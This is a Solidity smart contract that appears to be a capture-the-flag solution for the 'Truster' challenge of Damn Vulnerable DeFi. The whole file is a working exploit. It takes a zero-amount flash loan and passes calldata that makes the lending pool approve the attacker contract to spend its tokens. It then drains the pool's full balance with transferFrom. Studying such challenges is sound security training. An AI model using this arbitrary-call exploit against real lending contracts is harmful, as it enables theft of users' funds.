// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract TrusterAttacker {
    TrusterLenderPool public pool;
    address public attacker;

    modifier onlyAttacker() {
        if (msg.sender != attacker) {
            revert("Only attacker can call");
        }
        _;
    }

    constructor(address _pool) {
        pool = TrusterLenderPool(_pool);
        attacker = msg.sender;
    }

    function attack() external onlyAttacker {
        DamnValuableToken token = pool.token();
        uint256 poolBalance = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );
        bool success = pool.flashLoan(0, address(this), address(token), data);
        require(success, "Flash loan failed");
        success = token.transferFrom(address(pool), attacker, poolBalance);
        require(success, "Transfer failed");
    }
}
